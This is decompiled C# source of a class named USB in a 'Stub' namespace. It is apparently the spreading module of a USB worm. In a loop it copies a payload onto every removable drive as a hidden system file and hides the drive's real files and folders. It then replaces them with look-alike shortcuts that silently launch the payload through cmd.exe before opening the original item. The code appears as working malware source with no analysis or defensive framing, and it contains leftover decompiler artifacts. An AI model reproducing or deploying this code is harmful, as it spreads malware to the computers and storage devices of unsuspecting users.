using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200000C RID: 12
	public class USB
	{
		// Token: 0x06000044 RID: 68 RVA: 0x00006B78 File Offset: 0x00004D78
		public USB()
		{
			this.Off = false;
			this.thread = null;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00006B90 File Offset: 0x00004D90
		public void Start()
		{
			if (this.thread == null)
			{
				this.thread = new Thread(new ThreadStart(this.usbSP), 1);
				this.thread.Start();
			}
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00006BC0 File Offset: 0x00004DC0
		public void stopp()
		{
			try
			{
				this.thread.Abort();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00006BF8 File Offset: 0x00004DF8
		public void usbSP()
		{
			int num2;
			int num4;
			object obj3;
			try
			{
				IL_00:
				int num = 1;
				this.Off = false;
				IL_0A:
				checked
				{
					for (;;)
					{
						IL_63E:
						num = 3;
						if (this.Off)
						{
							break;
						}
						IL_0F:
						ProjectData.ClearProjectError();
						num2 = 1;
						IL_17:
						num = 5;
						object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
						IL_2F:
						num = 6;
						DriveInfo[] drives = DriveInfo.GetDrives();
						int i = 0;
						while (i < drives.Length)
						{
							DriveInfo driveInfo = drives[i];
							IL_47:
							num = 7;
							if (driveInfo.IsReady)
							{
								IL_55:
								num = 8;
								if (driveInfo.DriveType == DriveType.Removable)
								{
									IL_64:
									num = 9;
									this.ruta = driveInfo.Name;
									IL_74:
									num = 10;
									File.Copy(Settings.path2, this.ruta + "\\" + Settings.nameee, true);
									IL_98:
									num = 11;
									File.SetAttributes(this.ruta + "\\" + Settings.nameee, FileAttributes.Hidden | FileAttributes.System);
									IL_B7:
									num = 12;
									string[] files = Directory.GetFiles(this.ruta);
									int j = 0;
									while (j < files.Length)
									{
										string text = files[j];
										IL_D6:
										num = 13;
										if (Operators.CompareString(Path.GetExtension(text).ToLower(), ".lnk", false) != 0 & Operators.CompareString(text.ToLower(), this.ruta.ToLower() + Settings.nameee.ToLower(), false) != 0)
										{
											IL_128:
											num = 14;
											File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
											IL_133:
											num = 15;
											File.Delete(this.ruta + new FileInfo(text).Name + ".lnk");
											IL_157:
											num = 16;
											object instance = NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
											{
												this.ruta + new FileInfo(text).Name + ".lnk"
											}, null, null, null);
											IL_195:
											num = 17;
											NewLateBinding.LateSetComplex(instance, null, "windowstyle", new object[]
											{
												7
											}, null, null, false, true);
											IL_1BE:
											num = 18;
											NewLateBinding.LateSetComplex(instance, null, "TargetPath", new object[]
											{
												"cmd.exe"
											}, null, null, false, true);
											IL_1E6:
											num = 19;
											NewLateBinding.LateSetComplex(instance, null, "WorkingDirectory", new object[]
											{
												""
											}, null, null, false, true);
											IL_20E:
											num = 20;
											NewLateBinding.LateSetComplex(instance, null, "Arguments", new object[]
											{
												string.Concat(new string[]
												{
													"/c start ",
													Settings.nameee.Replace(" ", "\" \""),
													"&start ",
													new FileInfo(text).Name.Replace(" ", "\" \""),
													" & exit"
												})
											}, null, null, false, true);
											IL_291:
											num = 21;
											object obj = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "regread", new object[]
											{
												Operators.ConcatenateObject(Operators.ConcatenateObject("HKEY_LOCAL_MACHINE\\software\\classes\\", NewLateBinding.LateGet(objectValue, null, "regread", new object[]
												{
													"HKEY_LOCAL_MACHINE\\software\\classes\\." + Strings.Split(Path.GetFileName(text), ".", -1, CompareMethod.Binary)[Information.UBound(Strings.Split(Path.GetFileName(text), ".", -1, CompareMethod.Binary), 1)] + "\\"
												}, null, null, null)), "\\defaulticon\\")
											}, null, null, null));
											IL_323:
											num = 22;
											if (Strings.InStr(Conversions.ToString(obj), ",", CompareMethod.Binary) == 0)
											{
												IL_33B:
												num = 23;
												NewLateBinding.LateSetComplex(instance, null, "iconlocation", new object[]
												{
													text
												}, null, null, false, true);
												IL_35F:;
											}
											else
											{
												IL_361:
												num = 25;
												IL_365:
												num = 26;
												NewLateBinding.LateSetComplex(instance, null, "iconlocation", new object[]
												{
													RuntimeHelpers.GetObjectValue(obj)
												}, null, null, false, true);
											}
											IL_38E:
											num = 28;
											NewLateBinding.LateCall(instance, null, "Save", new object[0], null, null, null, true);
											IL_3AA:
											num = 29;
											obj = null;
											IL_3B0:
											instance = null;
										}
										IL_3B3:
										j++;
										IL_3B9:
										num = 32;
									}
									IL_3C8:
									num = 33;
									string[] directories = Directory.GetDirectories(this.ruta);
									int k = 0;
									while (k < directories.Length)
									{
										string text2 = directories[k];
										IL_3E8:
										num = 34;
										File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
										IL_3F4:
										num = 35;
										File.Delete(this.ruta + Path.GetFileNameWithoutExtension(text2) + " .lnk");
										IL_414:
										num = 36;
										object instance2 = NewLateBinding.LateGet(objectValue, null, "CreateShortcut", new object[]
										{
											this.ruta + Path.GetFileNameWithoutExtension(text2) + " .lnk"
										}, null, null, null);
										IL_44E:
										num = 37;
										NewLateBinding.LateSetComplex(instance2, null, "windowstyle", new object[]
										{
											7
										}, null, null, false, true);
										IL_477:
										num = 38;
										NewLateBinding.LateSetComplex(instance2, null, "TargetPath", new object[]
										{
											"cmd.exe"
										}, null, null, false, true);
										IL_49F:
										num = 39;
										NewLateBinding.LateSetComplex(instance2, null, "WorkingDirectory", new object[]
										{
											""
										}, null, null, false, true);
										IL_4C7:
										num = 40;
										NewLateBinding.LateSetComplex(instance2, null, "Arguments", new object[]
										{
											string.Concat(new string[]
											{
												"/c start ",
												Settings.nameee.Replace(" ", "\" \""),
												"&explorer /root,\"%CD%",
												new DirectoryInfo(text2).Name,
												"\" & exit"
											})
										}, null, null, false, true);
										IL_53C:
										num = 41;
										object obj2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "regread", new object[]
										{
											"HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\"
										}, null, null, null));
										IL_569:
										num = 42;
										if (Strings.InStr(Conversions.ToString(obj2), ",", CompareMethod.Binary) == 0)
										{
											IL_582:
											num = 43;
											NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[]
											{
												text2
											}, null, null, false, true);
											IL_5A7:;
										}
										else
										{
											IL_5A9:
											num = 45;
											IL_5AD:
											num = 46;
											NewLateBinding.LateSetComplex(instance2, null, "IconLocation", new object[]
											{
												RuntimeHelpers.GetObjectValue(obj2)
											}, null, null, false, true);
										}
										IL_5D7:
										num = 48;
										NewLateBinding.LateCall(instance2, null, "Save", new object[0], null, null, null, true);
										IL_5F3:
										num = 49;
										obj2 = null;
										IL_5FA:
										instance2 = null;
										k++;
										IL_603:
										num = 51;
									}
								}
							}
							IL_612:
							i++;
							IL_618:
							num = 54;
						}
						IL_627:
						num = 55;
						GC.Collect();
						IL_630:
						num = 56;
						Thread.Sleep(5000);
					}
					IL_64C:
					num = 58;
					this.thread = null;
					IL_657:
					goto IL_7A0;
					IL_660:;
				}
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_75C:
				goto IL_795;
				IL_75E:
				num4 = num;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num2);
				IL_771:;
			}
			catch when (endfilter(obj3 is Exception & num2 != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj4;
				goto IL_75E;
			}
			IL_795:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_7A0:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x04000024 RID: 36
		private bool Off;

		// Token: 0x04000025 RID: 37
		private Thread thread;

		// Token: 0x04000026 RID: 38
		private string ruta;
	}
}
